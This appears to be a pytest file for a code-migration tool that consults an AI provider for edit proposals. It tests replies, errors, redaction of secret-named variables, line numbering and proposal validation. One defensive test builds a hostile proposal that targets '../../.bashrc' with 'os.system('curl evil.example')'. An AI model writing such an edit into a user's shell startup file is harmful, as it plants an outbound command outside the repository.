"""Consultation cases no fixture repository reaches: replies, raises, hostile proposals, bytes."""

from __future__ import annotations

from typing import Any

import pytest
from pydantic import ValidationError

from obelize.models import BAIL_CODES, CONSULT_SKIPS, EditProposal, Finding
from obelize.packs import loader
from obelize.providers import base

PACK = loader.load("gemini/google-generativeai-to-google-genai").pack

SOURCE = b"""import google.generativeai as genai


def ask(prompt):
    model = genai.GenerativeModel("m", generation_config={"seed": 7})
    return model.generate_content(prompt).text
"""


def finding(**overrides: Any) -> Finding:
    fields: dict[str, Any] = {
        "path": "app.py",
        "line": 5,
        "column": 12,
        "kind": "call",
        "confidence_reason": "alias_resolved",
        "symbol": "google.generativeai.GenerativeModel",
        "scan_status": "needs_review",
        "bail": "generation_config_not_static",
    }
    fields.update(overrides)
    return Finding(**fields)


def ask(provider: base.ModelProvider, **overrides: Any) -> base.Consulted:
    return base.consult(
        provider,
        findings=[finding(**overrides)],
        plans=[],
        sources={"app.py": SOURCE},
        pack=PACK,
        environ={},
    )


PROPOSAL = EditProposal(
    path="app.py",
    start_line=4,
    end_line=6,
    symbol="google.generativeai.GenerativeModel",
    replacement="def ask(prompt):\n    return CLIENT.models.generate_content(prompt).text",
    rationale="The seed key has no equivalent, so the config is dropped.",
)


class _Answers:
    def __init__(self, reply: base.Reply) -> None:
        self.reply = reply
        self.calls = 0

    def request(self, consultation: base.Consultation) -> bytes:
        return b"{}"

    def propose(self, consultation: base.Consultation) -> base.Reply:
        self.calls += 1
        return self.reply


class _Raises:
    def __init__(self) -> None:
        self.calls = 0

    def request(self, consultation: base.Consultation) -> bytes:
        return b"{}"

    def propose(self, consultation: base.Consultation) -> base.Reply:
        self.calls += 1
        raise base.ProviderError("answer_not_json", "the endpoint returned prose")


def test_a_reply_is_carried_through_with_what_it_cost() -> None:
    provider = _Answers(base.Reply(proposal=PROPOSAL, tokens_in=310, tokens_out=64))
    result = ask(provider)

    assert provider.calls == 1
    assert result.proposals == (PROPOSAL,)
    assert (result.tokens_in, result.tokens_out) == (310, 64)
    assert result.answers[0].error is None


def test_a_provider_with_nothing_to_say_is_not_an_error() -> None:
    """Refusing is a normal outcome (ADR-003)."""
    result = ask(_Answers(base.Reply(proposal=None, tokens_in=310, tokens_out=8)))

    assert result.proposals == ()
    assert result.tokens_in == 310
    assert result.answers[0].error is None


def test_a_provider_that_raises_ends_one_consultation_and_no_more() -> None:
    """The failure is recorded against the row, which stays withheld."""
    result = ask(_Raises())

    assert result.proposals == ()
    assert (result.tokens_in, result.tokens_out) == (0, 0)
    assert result.answers[0].reply is None
    assert result.answers[0].error == "the endpoint returned prose"
    # The code, not the sentence, is what the run folder records (ADR-038 D1).
    assert result.answers[0].failure == "answer_not_json"


def test_a_provider_that_raises_is_not_asked_about_the_next_row_instead() -> None:
    """One failure does not end the pass: every row is still asked."""
    provider = _Raises()
    result = base.consult(
        provider,
        findings=[finding(), finding(line=6, kind="method_call")],
        plans=[],
        sources={"app.py": SOURCE},
        pack=PACK,
        environ={},
    )

    assert provider.calls == 2
    assert [answer.error for answer in result.answers] == [
        "the endpoint returned prose",
        "the endpoint returned prose",
    ]


def test_the_payload_loses_a_value_whose_variable_name_claims_it_is_a_secret() -> None:
    """The name-based redaction rule, graded here because no fixture can carry an environment."""
    seen: list[base.Consultation] = []

    class _Capture:
        def request(self, consultation: base.Consultation) -> bytes:
            return b"{}"

        def propose(self, consultation: base.Consultation) -> base.Reply:
            seen.append(consultation)
            return base.Reply(proposal=None)

    base.consult(
        _Capture(),
        findings=[finding(line=6)],
        plans=[],
        sources={
            "app.py": SOURCE.replace(b"    model =", b"    # not-in-the-payload\n    model =")
        },
        pack=PACK,
        environ={"MY_API_KEY": "not-in-the-payload"},
    )

    assert "not-in-the-payload" not in seen[0].context.text
    assert "[REDACTED:MY_API_KEY]" in seen[0].context.text


def test_a_context_says_whether_a_proposed_range_is_inside_it() -> None:
    context = base.Context("app.py", 10, 20, "")

    assert context.holds(10, 20)
    assert context.holds(12, 12)
    assert not context.holds(9, 20)
    assert not context.holds(10, 21)


@pytest.mark.parametrize(
    ("data", "first", "last"),
    [
        pytest.param(b"a = 1\r\nb = 2\r\n", "a = 1\r\n", "b = 2\r\n", id="crlf"),
        pytest.param(b"a = 1\nb = 2", "a = 1\n", "b = 2", id="no-trailing-newline"),
        # libcst decodes a BOM as `utf-8-sig`: it is gone from the text and the numbering.
        pytest.param(b"\xef\xbb\xbfa = 1\n", "a = 1\n", "a = 1\n", id="bom"),
        pytest.param(
            b"# -*- coding: latin-1 -*-\n# caf\xe9\n",
            "# -*- coding: latin-1 -*-\n",
            "# café\n",
            id="latin-1",
        ),
    ],
)
def test_a_file_is_split_into_the_lines_libcst_numbered(data: bytes, first: str, last: str) -> None:
    """Lines must match libcst's numbering, since the guard checks ranges against its positions."""
    lines = base.split_lines(data)

    assert lines[0] == first
    assert lines[-1] == last


def test_a_unicode_line_separator_is_not_a_line_break() -> None:
    """`str.splitlines` also breaks on U+2028, U+2029 and form feed, renumbering later lines."""
    data = 'NOTE = "a\u2028b"\nx = 1\n'.encode()

    assert base.split_lines(data) == ['NOTE = "a\u2028b"\n', "x = 1\n"]
    assert len(data.decode().splitlines()) == 3


def test_the_table_of_bails_a_model_is_never_asked_about_is_the_documented_one() -> None:
    """Exceptions, not permissions (ADR-036 D1): a new bail code is consulted by default."""
    assert base.NOT_CONSULTED == {
        "file_not_fully_migrated": "atomicity_only",
        "flag_only_surface": "pack_refused",
        "configure_consumed_elsewhere": "consumed_elsewhere",
    }
    assert set(base.NOT_CONSULTED) <= BAIL_CODES
    assert set(base.NOT_CONSULTED.values()) <= CONSULT_SKIPS


def test_the_six_words_for_a_row_that_is_not_asked_about() -> None:
    assert set(CONSULT_SKIPS) == {
        "atomicity_only",
        "consumed_elsewhere",
        "context_too_large",
        "not_a_source_file",
        "not_needs_review",
        "pack_refused",
    }


def test_a_proposal_holds_a_path_that_climbs_out_of_the_repository() -> None:
    """ADR-036 D5: `path` is unvalidated so the guard, not a JSON parse, refuses and names it."""
    proposal = EditProposal(
        path="../../.bashrc",
        start_line=1,
        end_line=1,
        symbol="not a qualified name at all",
        replacement="import os; os.system('curl evil.example')",
        rationale="This is what the guard has to be able to point at.",
    )

    assert proposal.path == "../../.bashrc"
    assert proposal.symbol == "not a qualified name at all"


@pytest.mark.parametrize(
    ("overrides", "message"),
    [
        pytest.param({"start_line": 9, "end_line": 4}, "no range at all", id="backwards"),
        pytest.param({"path": "   "}, "path is empty", id="blank-path"),
        pytest.param({"symbol": ""}, "symbol is empty", id="blank-symbol"),
        pytest.param({"rationale": "\n"}, "rationale is empty", id="blank-rationale"),
    ],
)
def test_a_proposal_that_cannot_be_held_is_refused(overrides: dict[str, Any], message: str) -> None:
    """Validation is shape only: enough to hold the value and talk about it."""
    fields: dict[str, Any] = {
        "path": "app.py",
        "start_line": 4,
        "end_line": 6,
        "symbol": "google.generativeai.GenerativeModel",
        "replacement": "pass",
        "rationale": "because",
    }
    fields.update(overrides)

    with pytest.raises(ValidationError, match=message):
        EditProposal(**fields)


@pytest.mark.parametrize("line", [0, -1])
def test_a_proposal_numbers_its_lines_from_one(line: int) -> None:
    """Line zero is a malformed proposal, not a hostile one, so validation refuses it."""
    with pytest.raises(ValidationError):
        EditProposal(
            path="app.py",
            start_line=line,
            end_line=6,
            symbol="google.generativeai.GenerativeModel",
            replacement="pass",
            rationale="because",
        )


def test_the_budget_counts_both_ends_of_the_range() -> None:
    """`CONTEXT_LINE_LIMIT` counts lines inclusively; no corpus repository sits at the boundary."""
    assert base.CONTEXT_LINE_LIMIT == 80

    # Scope arm: exactly the budget is sent; one line more falls to the window, not trimmed.
    assert base._range(50, [50], [(1, 80)], 400) == (1, 80)
    assert base._range(50, [50], [(1, 81)], 400) == (30, 70)

    # Window arm: one line more makes eighty-one with both margins, so nothing is sent.
    assert base._range(100, [139], [], 400) == (80, 159)
    assert base._range(100, [140], [], 400) is None
